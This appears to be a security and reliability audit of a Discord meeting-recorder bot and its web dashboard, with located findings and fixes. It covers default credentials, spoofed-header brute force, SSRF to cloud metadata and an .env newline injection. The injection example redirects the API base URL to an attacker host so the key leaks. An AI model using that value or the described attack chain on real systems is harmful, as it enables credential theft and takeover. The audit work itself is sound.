## Critical

### 1. Default `admin`/`admin` credentials fully functional forever
- **Where:** `src/store/users.js:168-170`, `src/web/auth.js:177`
- Seeded admin/admin account on first boot. `must_change_password` only nudges the UI; the API works fully with the default password indefinitely (login, all admin routes, Discord token presence, bot restart, `.env` writes).
- **Fix:** Block all non-auth API routes while `must_change_password` is set (403 "change password first"), or generate a random initial password printed to stdout on first boot.

## High

### 2. Dockerfile defaults `WEB_UI_HOST=0.0.0.0`
- **Where:** `Dockerfile:41`
- docker-compose maps `127.0.0.1:3000:3000`, but plain `docker run -p 3000:3000` (or Docker's iptables firewall bypass) exposes the dashboard publicly over plain HTTP, with default creds possible.
- **Fix:** Default `WEB_UI_HOST=127.0.0.1` in the Dockerfile; set `0.0.0.0` only in docker-compose. Add a startup warning when bound non-locally with the seeded admin still active.

### 3. Login rate limiter bypass via spoofed `X-Forwarded-For`
- **Where:** `src/web/server.js:15` + `src/web/auth.js:140`
- `app.set('trust proxy', true)` trusts XFF from any client. Limiter key is `req.ip|username`, so rotating XFF headers give a fresh bucket per request → unlimited brute force against `admin`.
- **Fix:** `app.set('trust proxy', 'loopback')` (or configurable `TRUSTED_PROXY`). Optionally add a global per-username lockout independent of IP.
- **Note:** Findings 1–3 chain: reachable port + XFF brute force + default/weak password = full takeover including Discord bot capabilities.

### 4. Unhandled `client.login()` rejection crashes the process
- **Where:** `src/bot.js:370`
- `client.login(config.discordToken)` is fire-and-forget with no `.catch`. A bad/expired token rejects → unhandled rejection kills the Node process, taking down the web dashboard that exists to fix the token. `BotController.startBot` returns before login settles, so its try/catch doesn't help.
- **Fix:** `client.login(...).catch(e => ...)` surfacing the error via controller state.

### 5. Frontend auth fails open on any `/auth/me` error
- **Where:** `web/src/AuthContext.jsx:28`
- Any non-401 failure (network blip, 500, proxy error) sets `authEnabled = false` and mounts the full dashboard unauthenticated. The graceful-degradation intent is 404-on-old-server only.
- **Fix:** Only disable auth when `e.status === 404`; on network/5xx errors show a retry state.

### 6. Stale/expired session not handled client-side
- **Where:** `web/src/api.js:3-7` (rejects 401 but nothing reacts), `web/src/pages/Reading.jsx:456` (swallows), `web/src/LiveContext.jsx:33` (treats 401 as "nothing recording")
- If the session cookie expires mid-use, pages show "Not authenticated" error strings or silently break; user stuck until manual refresh.
- **Fix:** Central fetch wrapper calls into `AuthContext` on any 401 to `setUser(null)` so the Gate re-renders to `<Login />`.

### 7. Retry after partial transcription silently drops audio
- **Where:** `src/pipeline/retry.js:29-30` + `src/pipeline/orchestrator.js:47`
- If transcription partially succeeds (some tracks fail), utterances are saved, then a summarize failure makes `retryPlan` see `hasUtterances > 0` → `resummarize`, permanently skipping the failed tracks even though PCM is still on disk. A crash mid-`addUtterance` loop similarly leaves a partial transcript that retry treats as complete.
- **Fix:** Record per-track transcription status (or compare PCM track count vs distinct transcribed tracks). Wrap `addUtterance` loop in a transaction; clear existing utterances before a retranscribe to avoid duplicates.

## Medium

### 8. `.env` file injection via embedded newlines in saved secrets
- **Where:** `src/store/secrets.js:53-60,74-79`
- Values are `trim()`ed but interior newlines survive; `upsertEnvLine` writes verbatim. Submitting `key: "x\nOPENAI_BASE_URL=https://evil.example/v1"` injects arbitrary env vars (e.g. redirect base URL to exfiltrate the real API key on next boot). Also `upsertEnvLine` builds a regex from the key without escaping (safe today with hardcoded keys, fragile).
- **Fix:** Reject values matching `/[\r\n]/` (and control chars); escape the key in the regex.

### 9. No CSRF tokens; protection rests solely on `SameSite=Lax`
- **Where:** `src/web/auth.js:34` (cookie), all state-changing routes
- Lax blocks cross-site POST in modern browsers but not same-site subdomain attackers, older clients, or cookie-rewriting proxies.
- **Fix (dependency-free):** Verify `Origin`/`Sec-Fetch-Site` on non-GET `/api` requests, or require a custom header (e.g. `X-Requested-With`) from the SPA.

### 10. SSRF via admin-settable `sttUrl`
- **Where:** `src/web/api.js:320-337`, `src/sidecar-controller.js:53-56`
- `PUT /system/connection` accepts any `sttUrl`; server fetches `{sttUrl}/health` and posts meeting audio there. Can target internal services / cloud metadata (`169.254.169.254`). Same class applies to `OLLAMA_URL`/`OPENAI_BASE_URL` if exposed later.
- **Fix:** Validate `sttUrl` is `http(s)`; warn/deny link-local and metadata IP ranges unless `ALLOW_REMOTE_STT=1`.

### 11. Weak password policy and long-lived sessions
- **Where:** `src/web/auth.js:175,198,212`, `src/store/users.js:34`, client-side `web/src/pages/Account.jsx:47`
- 4-char minimum, no complexity requirements, 30-day sessions. Brute-forceable, especially combined with #3.
- **Fix:** Minimum 8-10 chars (server AND client). Consider shorter TTL or rolling expiry.

### 12. Password change does not invalidate other sessions
- **Where:** `src/web/auth.js:172-185`
- After a password change following compromise, stolen sessions stay valid up to 30 days.
- **Fix:** In `/auth/password`, call `deleteUserSessions(req.user.id)` then issue a fresh session for the current request.

### 13. Capture race after `stopAll` leaks streams and loses audio
- **Where:** `src/voice/capture.js:27-52`, `src/voice/meeting-manager.js:44-45`
- The `speaking.on('start')` listener is never removed. Between `stopAll()` resolving and connection destroy, a new speaking event opens a fresh opus subscription + write stream that is never finished and not in the snapshotted `registry.list()`. Leaked stream, orphan `.pcm`, lost audio.
- **Fix:** `attachCapture` returns a `detach()` that removes the listener; call it first in `stopAll`.

### 14. Delivery failure after status `done` leaves inconsistent state
- **Where:** `src/pipeline/orchestrator.js:84-86`, `src/bot.js:57-65`, `src/delivery/post.js:7`
- `deliver` runs after `setMeetingStatus('done')`. If posting to Discord throws (perms, channel deleted), user sees "Meeting failed" but status is `done`, so the dashboard offers no retry. `postNotes` also returns silently when channel fetch fails — notes never posted, zero record.
- **Fix:** Catch deliver errors separately (status `delivery_failed` or a `delivered` flag with re-deliver action); log the silent-return path.

### 15. Audio dir leak on successful dashboard retry
- **Where:** `src/pipeline/retry.js:88-90`
- Only `bot.js` finalize deletes `audioDir` on success. Retry's retranscribe path never removes `data/audio/<id>`, so retried meetings keep PCM forever.
- **Fix:** `rm` on `ok: true` in retry, or move cleanup into the orchestrator.

### 16. Orphaned audio dirs never swept
- **Where:** `src/bot.js:216-219`
- Boot marks orphans `transcription_failed` but never reconciles `audioRoot` against the DB. Dirs for deleted/crashed meetings accumulate unboundedly.
- **Fix:** Startup sweep removing `audio/<id>` dirs whose meeting is missing or `done`.

### 17. No retention / unbounded DB growth / no export or backup
- **Where:** `src/store/db.js`
- No pruning, no `VACUUM`, no backup command, no full transcript/notes export (`/raw` truncates to 20 utterances).
- **Fix:** `pruneOlderThan(days)` + scheduled sweep + export endpoint (md/json) + documented WAL-aware sqlite backup.

### 18. Bot stop/restart from UI strands live recordings
- **Where:** `src/bot-controller.js:51-59`
- `stop()`/`restart()` (e.g. on credential change) destroys the client without stopping active meetings: no `stopAll` flush, no status update. Meetings stay `recording` until next boot's orphan sweep.
- **Fix:** Iterate `manager.active` and `stopAndLeave` each before `client.destroy()`.

### 19. Orphan sweep only runs if the bot starts
- **Where:** `src/bot.js:216`
- In web-only mode (no creds), stuck `recording`/`processing` rows from a crash stay stuck; `processing` state is memory-only and lost on restart without re-trigger.
- **Fix:** Move sweep to `index.js` (guarded against a running pipeline) or auto-retry eligible orphans on boot.

### 20. No mobile layout
- **Where:** `web/src/Layout.jsx:120-133`, `web/src/index.css:13`
- Fixed 248px sidebar with no breakpoint, no hamburger. On a phone the sidebar eats ~65% of the viewport.
- **Fix:** Hide sidebar below `md:` behind a toggle, or overlay drawer.

### 21. UX divergence from design spec
- **Where:** spec `docs/superpowers/specs/2026-06-29-web-gui-redesign-design.md` vs shipped app
- Spec mandates: land on latest meeting note, persistent meetings rail sidebar, header-only nav. Shipped: `Dashboard` stats landing, 7-item nav sidebar, no `MeetingsRail.jsx`. Spec lists auth, live view, analytics as out-of-scope YAGNI, yet all three shipped.
- **Fix:** Update the spec with a revision note, or realign the landing route to the latest note per Decision 2.

## Low

### 22. `requireAdmin` fails open when no user attached
- **Where:** `src/web/auth.js:125-128`. Safe with current wiring (`server.js:24`) but a footgun. Fix: deny when `req.user` absent; test server injects a fake admin.

### 23. Whole-file buffering in WAV conversion
- **Where:** `src/voice/audio.js:41-45`. `readFile` + `Buffer.concat` holds ~2x track in RAM (hour-long speaking turn ≈ 115 MB PCM). Fix: write header then stream-copy (data length = `stat().size`).

### 24. Attendees miss latecomers
- **Where:** `src/voice/meeting-manager.js:21`, `src/voice/capture.js:47`. Attendees snapshotted only at start; mid-meeting joiners get utterances but never appear in attendees. Fix: `db.addAttendee` from the speaking-start path.

### 25. STT client retries 4xx blindly with no backoff
- **Where:** `src/adapters/stt-client.js:17-32`. Re-uploads whole file each retry. Fix: skip retry on 4xx, add delay.

### 26. `startCapture` throw leaks a `recording` row
- **Where:** `src/voice/meeting-manager.js:20-24`. Wrap and mark failed.

### 27. `client.on('error')` never flips controller state

### 28. Failure notice references possibly-missing script

### 29. Logout doesn't hard-reset client state

### 30. Dropdown menus lack dismissal and aria

### 31. Full page reloads after delete/merge, `window.confirm` for destructive delete

### 32. Login inputs missing label association

### 33. Login screen advertises `admin`/`admin` to unauthenticated visitors
- **Where:** `web/src/pages/Login.jsx:57-59`. Fix: server reports `defaultPasswordActive` in `/auth/me`; only show hint then.

### 34. LLM ask-answers render raw markdown as plaintext
- **Where:** `web/src/pages/Reading.jsx:180`. Safe but ugly. Fix: `react-markdown` (escapes HTML by default). Do not hand-roll HTML injection.

### 35. Polling inefficiency
- **Where:** `web/src/LiveContext.jsx:44-60`. Polls every 4s even with zero guilds. Fix: skip when `guilds.length === 0`; back off after N empty responses.
